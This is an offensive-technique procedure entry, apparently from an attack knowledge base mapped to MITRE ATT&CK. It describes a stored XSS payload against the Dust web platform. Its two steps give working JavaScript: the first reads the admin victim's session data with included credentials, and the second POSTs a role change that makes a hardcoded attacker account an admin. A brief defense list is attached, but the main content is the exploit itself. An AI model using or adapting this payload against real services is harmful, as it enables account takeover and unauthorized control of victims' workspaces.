---
id: 123e4567-e89b-12d3-a456-426614174004
name: Trigger-XSS-for-Privilege-Escalation
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.218Z'
tactics:
  - '[[Privilege Escalation]]'
techniques:
  - '[[JavaScript]]'
  - '[[Valid Accounts]]'
tags:
  - xss-execution
  - privilege-escalation
commands:
  - '[[commands/fetch-user-data-javascript]]'
  - '[[commands/promote-user-role-fetch]]'
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Valid Accounts]]'
---

# Trigger-XSS-for-Privilege-Escalation

## Summary

This procedure executes the stored XSS payload in the victim's browser to fetch workspace data and escalate the attacker's account privileges to admin.

## Description

When the admin views the file, the unsanitized HTML runs JavaScript that queries the user's API for workspace details, then POSTs to promote the dummy account. This impersonates the admin for escalation. Prerequisites: Victim access to URL; pre-known attackerUserId. Outcomes: Attacker gains admin role, enabling takeover.

## Requirements

1. Victim (admin) authenticated session
2. Embedded JS payload in uploaded HTML with attackerUserId hardcoded
3. Access to Dust API from browser (credentials: 'include')

## Defense

Defensive measures and detection strategies:

- Sanitize all rendered file content to strip scripts
- Implement Content Security Policy (CSP) to block inline JS
- Audit API calls for unauthorized role changes

## Objectives

1. Execute JS in victim's context for data access
2. Escalate dummy account to admin
3. Enable full workspace control post-escalation

## Instructions

### Step 1: Fetch User Data

**Context**: On file view, JS fetches current user info to extract workspaceId.

**Command** ([[commands/fetch-user-data-javascript]]):
```javascript
fetch('https://dust.tt/api/user', {
  method: 'GET',
  headers: {'accept': '*/*', 'x-commit-hash': '41c0391'},
  credentials: 'include'
}).then(r => r.json()).then(user => {
  // Extract workspaceId = user.workspaces[0].sId, victimUserId = user.id
});
```

> Returns JSON with user data, including workspaces array for ID extraction.

### Step 2: Promote Attacker Role

**Context**: Use extracted data to POST role update for attacker.

**Command** ([[commands/promote-user-role-fetch]]):
```javascript
const workspaceId = user.workspaces[0].sId;
const attackerUserId = '<known_dummy_id>';
fetch(`https://dust.tt/api/w/${workspaceId}/members/${attackerUserId}`, {
  method: 'POST',
  headers: {'content-type': 'application/json', 'accept': '*/*', 'x-commit-hash': '41c0391'},
  credentials: 'include',
  body: JSON.stringify({role: 'admin'})
});
```

> Successful response indicates role updated; attacker now admin.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[JavaScript]] JavaScript
- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/fetch-user-data-javascript]]
- [[commands/promote-user-role-fetch]]

## Tools Used


## Tags

- [[xss-execution]]
- [[privilege-escalation]]
